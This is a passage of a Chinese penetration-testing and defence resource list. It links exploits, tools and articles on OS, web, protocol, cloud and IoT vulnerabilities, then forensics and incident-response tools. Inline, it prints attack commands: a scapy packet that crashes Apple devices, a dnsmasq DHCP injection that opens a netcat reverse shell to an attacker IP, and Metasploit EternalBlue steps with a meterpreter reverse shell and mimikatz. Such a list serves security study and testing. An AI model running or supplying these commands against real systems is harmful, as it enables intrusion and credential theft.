- [DotDefender](http://www.applicure.com/Products/dotdefender)
- [F5](https://www.f5.com/products/security/advanced-waf)
- [Fortinet](https://www.fortinet.com/products/web-application-firewall/fortiweb.html)
- [GoDaddy Website Protection](https://sg.godaddy.com/web-security/website-security)
- [Greywizard](https://greywizard.com/)
- [Imunify360](https://www.imunify360.com/)
- [Incapsula (Imperva Inc.)](https://www.imperva.cn/company/incapsula)
- [Instart DX (Instart Logic)](https://www.instart.com/products/web-security)
- [Janusec Application Gateway](https://www.janusec.com/)
- [Kona Site Defender (Akamai)](https://www.akamai.com/us/en/products/security/kona-site-defender.jsp)
- [LiteSpeed Firewall (LiteSpeed Technologies)](https://www.litespeedtech.com/products)
- [ModSecurity](https://www.modsecurity.org)
- [NAXSI (NBS Systems)](https://github.com/nbs-system/naxsi)
- [Nemesida (PentestIt)](https://waf.pentestit.ru/)
- [NetScaler AppFirewall (Citrix Systems)](https://www.citrix.com/products/citrix-web-app-firewall/)
- [NevisProxy (AdNovum)](https://www.adnovum.ch/en/solutions/nevis.html)
- [NexusGuard Firewall (NexusGuard)](https://www.nexusguard.com/)
- [NinjaFirewall (NinTechNet)](https://nintechnet.com/ninjafirewall/)
- [Palo Alto Next Gen Firewall (Palo Alto Networks)](https://www.paloaltonetworks.com/products/secure-the-network/next-generation-firewall)
- [PerimeterX (PerimeterX)](https://www.perimeterx.com/products/bot-defender/bot-defender-web/)
- [Radware](https://www.radware.com/products/appwall/)
- [Reblaze (Reblaze)](https://www.reblaze.com/product/web-application-firewall/)
- [RSFirewall (RSJoomla!)](https://www.rsjoomla.com/joomla-extensions/joomla-security.html)
- [SecuPress WordPress Security (SecuPress)](https://secupress.me/)
- [Secure Entry (United Security Providers)](https://www.united-security-providers.ch/angebot/web-access-management/produkte/usp-ses-web-application-firewall)
- [SecureSphere (Imperva Inc.)](https://www.imperva.com/products/securesphere/)
- [SEnginx (Neusoft)](https://github.com/NeusoftSecurity/SEnginx)
- [Sitelock (TrueShield)](https://www.sitelock.com/products/web-application-firewall)
- [SonicWall](https://www.sonicwall.com/)
- [UTM Web Protection (Sophos)](https://www.sophos.com/en-us/products/choose-firewall.aspx)
- [StackPath (StackPath)](https://www.stackpath.com/products/waf/)
- [Sucuri CloudProxy (Sucuri Inc.)](https://sucuri.net/website-firewall/)
- [VirusDie (VirusDie LLC)](https://virusdie.ru/)
- [Wallarm (Wallarm Inc.)](https://wallarm.com/products/ng-waf)
- [WatchGuard (WatchGuard Technologies)](https://www.watchguard.com/wgrd-products/firewall-appliances)
- [WebARX (WebARX Security Solutions)](https://www.webarxsecurity.com/product/)
- [WebKnight (AQTRONIX)](https://www.aqtronix.com/?PageID=99)
- [WebTotem (WebTotem)](https://wtotem.com/)
- [Wordfence (Feedjit)](https://www.wordfence.com/)
- [XLabs Security WAF (XLabs)](https://www.xlabs.com.br/waf/)
- [ZScaler (Accenture)](https://admin.zscloud.net/)

---

## OS vul
### IOS VUL

**CVE-2018-4407**
- 文章
    - [远程打挂所有的apple设备 — CVE-2018-4407分析](https://mabin004.github.io/2018/11/01/%E8%BF%9C%E7%A8%8B%E6%89%93%E6%8C%82%E6%89%80%E6%9C%89%E7%9A%84apple%E8%AE%BE%E5%A4%87-CVE-2018-4407-%E5%88%86%E6%9E%90/)

- POC | Payload | exp
    ```bash
    $sudo scapy
    >>send(IP(dst="192.168.1.151",options=[IPOption("A"*8)])/TCP(dport=8888,options=[(19, "1"*33)]))
    ```

---

### Linux vul

**本地提权类**
- **CVE-2016-5195 脏牛 Dirty COW**
    - 影响范围
        - Linux内核>=2.6.22(2007年发行)，直到2016年10月18日修复

    - 文章
        - [[翻译]从内核角度分析Dirty Cow原理](https://bbs.pediy.com/thread-218797.htm)

    - POC | Payload | exp
        - [scumjr/dirtycow-vdso](https://github.com/scumjr/dirtycow-vdso)
        - [dirtycow/dirtycow.github.io](https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs)
        - [gbonacini/CVE-2016-5195](https://github.com/gbonacini/CVE-2016-5195)

- **CVE-2017–1000405 Huge Dirty COW**
    - 文章
        - [“Huge Dirty COW” (CVE-2017–1000405)](https://medium.com/bindecy/huge-dirty-cow-cve-2017-1000405-110eca132de0)

    - POC | Payload | exp
        - [bindecy/HugeDirtyCowPOC](https://github.com/bindecy/HugeDirtyCowPOC)

**远程利用类**
- **CVE-2014-6271** Bash 远程代码执行漏洞“破壳”
    - 文章
        - [Bash远程代码执行漏洞“破壳”(CVE-2014-6271)分析](https://www.antiy.com/response/CVE-2014-6271.html)

    - POC | Payload | exp
        - [scottjpack/shellshock_scanner](https://github.com/scottjpack/shellshock_scanner)

    - 本地验证方法

        `env x='() { :;}; echo Vulnerable CVE-2014-6271 ' bash -c "echo test"`

        执行命令后，如果显示Vulnerable CVE-2014-6271，证系统存在漏洞，可改变echo Vulnerable CVE-2014-6271为任意命令进行执行。

    - MSF 模块
        ```bash
        use exploit/linux/http/ipfire_bashbug_exec
        use exploit/multi/http/cups_bash_env_exec
        use exploit/unix/dhcp/bash_environment
        ```

- **CVE-2018-1111** DHCP 客户端脚本代码执行漏洞
    - 文章
        - [CVE-2018-1111复现环境搭建与dhcp命令注入](https://www.freebuf.com/articles/web/191884.html)
        - [DHCP客户端脚本代码执行漏洞分析 (CVE-2018-1111) ](https://xz.aliyun.com/t/2455)

    - POC | Payload | exp
        - [ knqyf263/CVE-2018-1111](https://github.com/knqyf263/CVE-2018-1111)
        - [kkirsche/CVE-2018-1111](https://github.com/kkirsche/CVE-2018-1111)

    - 本地利用方法
        ```
        attacker: kali linux 2018 x64 192.168.71.5
        victim: Centos 7 x64 192.168.71.10
        ```
        ```vim
        vim dnsmasq.conf

        bind-interfaces

        interface=eth0
        except-interface=lo
        dhcp-range=192.168.71.10,192.168.71.20,12h
        dhcp-option=3,192.168.71.5
        dhcp-option=6,192.168.71.5
        log-queries
        log-facility=/var/log/dnsmasq.log
        ```
        `dnsmasq -dC dnsmasq.conf --dhcp-option="252,malayke'&nc -e /bin/bash 192.168.71.5 6666 #"`

        `nc -l -p 6666 -v`

        重启 CentOS 的网络服务，然后 shell 就反弹回来了

---

### UNIX vul
#### CISCO
**CVE-2017-6736 Cisco IOS remote code execution**
- [artkond/cisco-snmp-rce](https://github.com/artkond/cisco-snmp-rce)

---

### Windows vul

**漏洞查询**
- **文章**
    - [windows本地提权对照表](http://www.7kb.org/138.html)

- **文件**
    - [BulletinSearch-微软官网提供的漏洞excel列表](http://download.microsoft.com/download/6/7/3/673E4349-1CA5-40B9-8879-095C72D5B49D/BulletinSearch.xlsx)

- **工具**
    - [GDSSecurity/Windows-Exploit-Suggester](https://github.com/GDSSecurity/Windows-Exploit-Suggester) - 此工具将目标修补程序级别与Microsoft漏洞数据库进行比较，以便检测目标上可能缺少的修补程序。
    - [bitsadmin/wesng](https://github.com/bitsadmin/wesng) - Windows Exploit Suggester
    - [tengzhangchao/microsoftSpider](https://github.com/tengzhangchao/microsoftSpider) - 爬取微软漏洞信息，MS对应的每个版本操作系统KB号以及补丁下载地址。
    - [提权辅助网页](https://bugs.hacking8.com/tiquan/)

**漏洞资源**
- [SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits) - Windows平台提权漏洞集合
- [WindowsExploits/Exploits](https://github.com/WindowsExploits/Exploits)- Windows Exploits

**混合类**
- **CVE-2018-8420 Msxml 解析器的远程代码执行漏洞**
    - POC | Payload | exp
        - [Lz1y/CVE-2018-8420](https://github.com/Lz1y/CVE-2018-8420)

**本地提权类**
- **CVE-2018-8120**
    - POC | Payload | exp
        - [unamer/CVE-2018-8120: CVE-2018-8120 Windows LPE exploit](https://github.com/unamer/CVE-2018-8120)
        - [alpha1ab/CVE-2018-8120: CVE-2018-8120 Exploit for Win2003 Win2008 WinXP Win7](https://github.com/alpha1ab/CVE-2018-8120)

**远程利用类**
- **MS08-067 & CVE-2008-4250**
    - MSF 模块
        ```bash
        use exploit/windows/smb/ms08_067_netapi
        set payload windows/x64/meterpreter/reverse_tcp
        set target 0
        ```

- **MS12-020 & CVE-2012-0002**
    - MSF 模块
        ```bash
        use auxiliary/scanner/rdp/ms12_020_check
        use auxiliary/dos/windows/rdp/ms12_020_maxchannelids
        ```

- **MS14-066 & CVE-2014-6321**
    - POC | Payload | exp
        - [anexia-it/winshock-test](https://github.com/anexia-it/winshock-test)

- **MS15-034 & CVE-2015-1635**
    - POC | Payload | exp
        - [MS15-034 Checker](https://pastebin.com/ypURDPc4)

    - 文章
        - [MS15-034/CVE-2015-1635 HTTP远程代码执行漏洞分析](http://blogs.360.cn/post/cve_2015_6135_http_rce_analysis.html)

    - MSF 模块
        ```bash
        use auxiliary/scanner/http/ms15_034_http_sys_memory_dump    # 读取服务器内存数据
        use auxiliary/dos/http/ms15_034_ulonglongadd    # 进行 dos 攻击
        ```

- **MS17-010**
    - MSF 模块
        ```bash
        # 发现,检测
        use auxiliary/scanner/smb/smb_ms17_010
        set rhosts <ip>
        run

        # 使用 payload 连上去
        use exploit/windows/smb/ms17_010_eternalblue
        set payload windows/x64/meterpreter/reverse_tcp
        set lhost <ip>  # 设一下本机地址
        set rhosts <ip>
        run

        # msf 下加载 mimikatz 模块
        load mimikatz
        kerberos
        ```

- **bluekeep & CVE-2019-0708**
    - POC | Payload | exp
        - [zerosum0x0/CVE-2019-0708](https://github.com/zerosum0x0/CVE-2019-0708)
        - [robertdavidgraham/rdpscan](https://github.com/robertdavidgraham/rdpscan)
        - [Ekultek/BlueKeep](https://github.com/Ekultek/BlueKeep)
        - [mekhalleh/cve-2019-0708](https://github.com/mekhalleh/cve-2019-0708) (实测、蓝屏)

---

## Web vul
**笔记**
- [web 服务和中间件整合笔记](./笔记/web服务和中间件整合笔记.md)

### 各类论坛/CMS/框架
**工具**
- [SecWiki/CMS-Hunter](https://github.com/SecWiki/CMS-Hunter)
- [Q2h1Cg/CMS-Exploit-Framework](https://github.com/Q2h1Cg/CMS-Exploit-Framework)
- [Lucifer1993/AngelSword](https://github.com/Lucifer1993/AngelSword)

### 中间件/服务
**文章**
- [中间件漏洞合集](https://mp.weixin.qq.com/s/yN8lxwL-49OKfVR86JF01g)

---

## 业务/软件类 vul
**笔记**
- [业务/软件 vul 整合笔记](./笔记/业务软件vul整合笔记.md)

---

## 业务/协议类 vul

`注:本分类里内容并非全是协议的 bug，部分“基于、使用”这个协议的应用所存在的漏洞也算在其中，例如 dns 域传送漏洞，其并非 dns 协议本身的漏洞，为服务部署时的配置问题，但应用与 DNS 相关的业务，故此分类，特此说明`

### dns
**CVE-1999-0532** dns 域传送漏洞
```bash
dig @dns.xxx.edu.cn axfr xxx.edu.cn
@指定域名服务器；axfr 为域传送指令；xxx.edu.cn表示要查询的域名；
```

**子域接管漏洞**
- 文章/案例
    - [EdOverflow/can-i-take-over-xyz](https://github.com/EdOverflow/can-i-take-over-xyz/)
    - [HackerOne漏洞案例 | 子域名劫持漏洞的挖掘指南](https://www.freebuf.com/articles/web/183254.html)
    - [A Guide To Subdomain Takeovers | HackerOne](https://www.hackerone.com/blog/Guide-Subdomain-Takeovers)

### ipv6
**文章**
- [浅谈IPv6的入侵与防御](https://www.freebuf.com/articles/web/202901.html)

**工具**
- [vanhauser-thc/thc-ipv6](https://github.com/vanhauser-thc/thc-ipv6)
- [fgont/ipv6toolkit](https://github.com/fgont/ipv6toolkit)

### SMTP
**文章**
- [SMTP协议25端口渗透测试记录](https://www.sqlsec.com/2017/08/smtp.html)
- [SMTP用户枚举原理简介及相关工具](https://www.freebuf.com/articles/web/182746.html)

### SNMP
**文章**
- [SNMP协议攻击](https://xz.aliyun.com/t/1562)
- [渗透测试中如何收集利用SNMP协议数据](https://www.freebuf.com/articles/network/104522.html)

**snmp 弱口令**
- 文章
    - [烂泥：使用snmpwalk采集设备的OID信息](https://www.ilanni.com/?p=8408)
    - [snmp弱口令引起的信息泄漏](http://drops.xmd5.com/static/drops/tips-409.html)

- 利用

    安装 `yum -y install net-snmp-utils`

    Usage
    ```bash
    snmpwalk -v 2c -c public 192.168.xxx.xxx
    snmp-check 192.168.xxx.xxx -c public -v 2c
    ```

---

### SSL
**文章**
- [SSL＆TLS 安全性测试](https://4hou.win/wordpress/?p=2355)

**工具**
- [MassBleed](https://github.com/1N3/MassBleed)
- [sslscan](https://github.com/rbsec/sslscan)
- [testssl](https://github.com/drwetter/testssl.sh)

**CVE-2014-3566 SSL 3.0 POODLE攻击信息泄露漏洞**
- 文章
    - [CVE-2014-3566 SSLv3 POODLE原理分析](http://drops.xmd5.com/static/drops/papers-3194.html)

- POC | Payload | exp
    - [mpgn/poodle-PoC](https://github.com/mpgn/poodle-PoC)

- MSF 模块
    ```
    use auxiliary/scanner/http/ssl_version
    ```

**OpenSSL**
- **CVE-2014-0160 Heartbleed**
    - 文章
        - [心脏滴血HeartBleed漏洞研究及其POC](https://www.cnblogs.com/KevinGeorge/p/8029947.html)
        - [OpenSSL心脏出血漏洞全回顾](https://www.freebuf.com/articles/network/32171.html)
        - [Heartbleed 实战：一个影响无数网站的缓冲区溢出漏洞](https://onebitbug.me/reproduced/2014/04/09/heartbleed-poc/)
        - [Heartbleed漏洞的复现与利用](https://blog.csdn.net/biziwaiwai/article/details/79323334)
        - [Heartbleed心脏出血漏洞靶场搭建](https://blog.csdn.net/yaofeino1/article/details/54377537)

    - POC | Payload | exp
        - [OpenSSL TLS Heartbeat Extension - 'Heartbleed' Memory Disclosure](https://www.exploit-db.com/exploits/32745)

---

## 云渗透
### aws
**文章**
- [Attacking AWS: the full cyber kill chain](https://www.slideshare.net/wojdwo/attacking-aws-the-full-cyber-kill-chain-144590283)

**工具**
- [toniblyx/prowler](https://github.com/toniblyx/prowler)
- [RhinoSecurityLabs/pacu](https://github.com/RhinoSecurityLabs/pacu)
- [arkadiyt/aws_public_ips](https://github.com/arkadiyt/aws_public_ips)

**S3**
- **文章**
    - [How security researchers discover open Amazon S3 servers](https://www.devicelock.com/blog/how-security-researchers-discover-open-amazon-s3-servers.html)
    - [Blog, Whats in Amazon's buckets? - DigiNinja](https://digi.ninja/blog/whats_in_amazons_buckets.php)
    - [Bucket Finder - DigiNinja](https://digi.ninja/projects/bucket_finder.php)

- **工具**
    - [gwen001/s3-buckets-finder](https://github.com/gwen001/s3-buckets-finder)
    - [brianwarehime/inSp3ctor](https://github.com/brianwarehime/inSp3ctor)
    - [PayloadsAllTheThings/AWS Amazon Bucket S3](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/AWS%20Amazon%20Bucket%20S3)
    - [eth0izzle/bucket-stream](https://github.com/eth0izzle/bucket-stream)

---

# BlueTeam
## 事件响应
### 操作系统取证
**win**

- [The Sleuth Kit (TSK)](https://www.sleuthkit.org/) - 一套强大的数字调查、取证工具集合

- **DNS**
    - [dnsdataview](https://www.nirsoft.net/utils/dns_records_viewer.html) - 记录 DNS 记录

- **动作记录**
    - [Device Cleanup Tool](https://www.uwe-sieber.de/misc_tools_e.html) – 查看电脑连接过的设备
    - [LastActivityView](https://www.nirsoft.net/utils/computer_activity_view.html) – 最近你干什么了
    - [OpenSaveFilesView](https://www.nirsoft.net/utils/open_save_files_view.html) – 显示文件打开、保存记录
    - [TurnedOnTimesView](https://www.nirsoft.net/utils/computer_turned_on_times.html) – 快速查看系统开关机时间
    - [uknowsec/loginlog_windows](https://github.com/uknowsec/loginlog_windows) - 读取登录过本机的登录失败或登录成功的所有计算机信息

- **key**
    - 本部分在RedTeam --> windows 渗透 --> 口令获取及破解

- **蓝牙**
    - [bluetoothview](https://www.nirsoft.net/utils/bluetooth_viewer.html) - 监控周围的蓝牙设备

- **无线**
    - [wifihistoryview](https://www.nirsoft.net/utils/wifi_history_view.html) - Wi-Fi 连接历史记录
    - [wirelesskeyview](https://www.nirsoft.net/utils/wireless_key.html)- 查看本地wifi密码

### 文件取证
**exif**
- [ExifTool](https://www.sno.phy.queensu.ca/~phil/exiftool/)

**浏览器取证**
- [obsidianforensics/hindsight](https://github.com/obsidianforensics/hindsight) - 历史访问记录取证工具(真是不给人留条活路)

### WEB 取证
**文章**
- [比敌人更了解敌人 [ 取证入门 web篇 ]](https://www.freebuf.com/column/147929.html)

### 应急处置
- [meirwah/awesome-incident-response](https://github.com/meirwah/awesome-incident-response)
- [NextronSystems/APTSimulator](https://github.com/NextronSystems/APTSimulator) - 伪装成 APT 受害者？(还有这种操作)

**勒索软件**
- [jiansiting/Decryption-Tools: Decryption-Tools](https://github.com/jiansiting/Decryption-Tools)
- [企业中了勒索病毒该怎么办？可以解密吗？](https://www.freebuf.com/articles/es/206199.html)

**溯源案例**
- [6.【应急响应】Linux入侵排查思路 - bmjoker](https://www.cnblogs.com/bmjoker/p/9557033.html)
- [Linux应急响应（一）：SSH暴力破解](https://www.secpulse.com/archives/76051.html)
- [服务器入侵溯源小技巧整理](http://www.freebuf.com/articles/rookie/179638.html)
- [记一次博客被日的分析过程](https://bbs.ichunqiu.com/thread-44743-1-2.html)
- [metinfo后台getshell exp](https://bbs.ichunqiu.com/thread-29582-1-3.html)
- [一键安装藏隐患，phpStudy 批量入侵的分析与溯源](https://www.anquanke.com/post/id/162787)

---

## 运维保障
### 基线
**资源**
- [CIS Benchmarks](https://learn.cisecurity.org/benchmarks)
    安全配置建议，内容很多，虽然是英文版本

**工具**
- [lis912/CapOS](https://github.com/lis912/CapOS)
    等级保护测评 windows 基线检查

**文章**
- [经验分享 | 企业如何做好安全基线配置](https://www.freebuf.com/articles/es/158781.html)

---

### 系统安全
**在线扫描仪和沙箱**
- [VirusTotal](https://www.virustotal.com/gui/home/upload)
- [360威胁情报中心](https://ti.360.net/)
- [VenusEye](https://www.venuseye.vip/)
- [anlyz|REM](https://sandbox.anlyz.io/#!/malware-dashboard)
- [firmware · ǝɹ - Free Online Firmware Unpacker, Scanner, Analyser - Firmware Genomics/Genome Project - Firmware Vulnerability and Backdoor Discovery - Firmware Mounting, Modification, Loading and Emulation - Embedded and Internet-of-Things Security](http://firmware.re/)
- [Free Automated Malware Analysis Service - powered by Falcon Sandbox](https://www.hybrid-analysis.com/)
- [AVCaesar](https://avcaesar.malware.lu/)
- [Intezer Analyze](https://analyze.intezer.com/#/)
- [Jotti's malware scan](https://virusscan.jotti.org/en)
- [NetworkTotal - Free Online Network Traffic Scanner](https://www.networktotal.com/index.html)
- [OPSWAT MetaDefender Cloud | Vulnerability, CDR and Antivirus APIs](https://metadefender.opswat.com/#!/)
- [PDFExaminer: pdf malware analysis](http://www.pdfexaminer.com/)
- [Scan Android application - Andrototal](https://andrototal.org/)
- [VirSCAN.org-多引擎在线病毒扫描网 v1.02，当前支持 41 款杀毒引擎](http://www.virscan.org/language/zh-cn/)
- [腾讯哈勃分析系统](https://habo.qq.com/)
- [首页 - 微步在线威胁情报社区](https://x.threatbook.cn/)
- [cryptam: office document malware detection and analysis](http://www.cryptam.com/)
- [恶意软件分析 & URL链接扫描 免费在线病毒分析平台 | 魔盾安全分析](https://www.maldun.com/analysis/)
- [NoDistribute - Online Virus Scanner Without Result Distribution](http://www.nodistribute.com/)
- [Scan your website - urlscan.io](https://urlscan.io/)
- [奇安信威胁情报中心](https://ti.qianxin.com/)

---

### 应用安全
**查暗链**
1. 搜索引擎 : `黑产关键字+site:"网站域名"`
2. 用类似 xenu(尽量在虚拟机下运行)的工具批量爬取网站外链查看有无关键字

**查后门**
- [D 盾](http://www.d99net.net/)
- [深信服 Web 后门扫描](http://edr.sangfor.com.cn/backdoor_detection.html)
- [河马 webshell 查杀](http://www.shellpub.com/)
- [铱迅 Webshell 扫描器](http://www.yxlink.com/technology.php)
- [网站安全狗网马查杀](download.safedog.cn/download/software/safedogwzApache.exe)
- [OpenRASP WEBDIR+检测引擎](https://scanner.baidu.com)
- [cys3c/BackdoorMan](https://github.com/cys3c/BackdoorMan)
- [he1m4n6a/findWebshell](https://github.com/he1m4n6a/findWebshell)
- [mornone/webshell-find-tools](https://github.com/mornone/webshell-find-tools)
- [chiruom/Webshell_finder](https://github.com/chiruom/Webshell_finder)
- [virink/as_scanwebshell](https://github.com/virink/as_scanwebshell) - 通过正则匹配，查找后门 webshell

---

### 加固
- [加固笔记](./笔记/加固笔记.md)

---

# 工控/IoT/物理
**漏洞库**
- [工控系统行业漏洞库平台](http://ivd.winicssec.com/index.php/Home/Search/index.html)

## CPU
**Meltdown/Spectre**
- 文章
    - [An Explanation of the Meltdown/Spectre Bugs for a Non-Technical Audience](https://blog.cloudflare.com/meltdown-spectre-non-technical/)
    - [简单谈谈近期的Intel处理器漏洞](https://bbs.kafan.cn/thread-2112818-1-1.html)

- POC | Payload | exp
    - [speed47/spectre-meltdown-checker](https://github.com/speed47/spectre-meltdown-checker)

---

## 射频/无线
鸽

---

## 物联网设备
### Printer

**PRET**

Installation
```bash
git clone https://github.com/RUB-NDS/PRET.git
cd PRET

pip install colorama pysnmp
```

Usage
```bash
python2 ./pret.py
python2 ./pret.py xxx.xxx.xxx.xxx pjl
python2 ./pret.py xxx.xxx.xxx.xxx ps
python2 ./pret.py xxx.xxx.xxx.xxx pcl
```

---

### Router - 泛指家用路由器
**漏洞库**
- [Routerpwn - One click exploits, generators, tools, news, vulnerabilities, poc, alerts](http://routerpwn.com/)

**案例**
- [Assessing the security of a portable router: a look inside its hardware - Malwarebytes Labs | Malwarebytes Labs](https://blog.malwarebytes.com/security-world/technology/2018/09/security-portable-router-inside-hardware/)

**工具**
- **routersoloit**

    Installation
    ```bash
    git clone https://www.github.com/threat9/routersploit.git
    cd routersploit
    python3 -m pip install -r requirements.txt
    python3 rsf.py
    ```

    Usage
    ```bash
    use scanners/autopwn
    set target
    run
    ```

---

## USB HACKER
鸽

---

`你以为很多事是可以重复的,还有下一次,但你错了。包括你儿时的万花筒或纸飞机,抄作业或买糖果,早就是此生的最后一次。(韩少功 《日夜书》) `
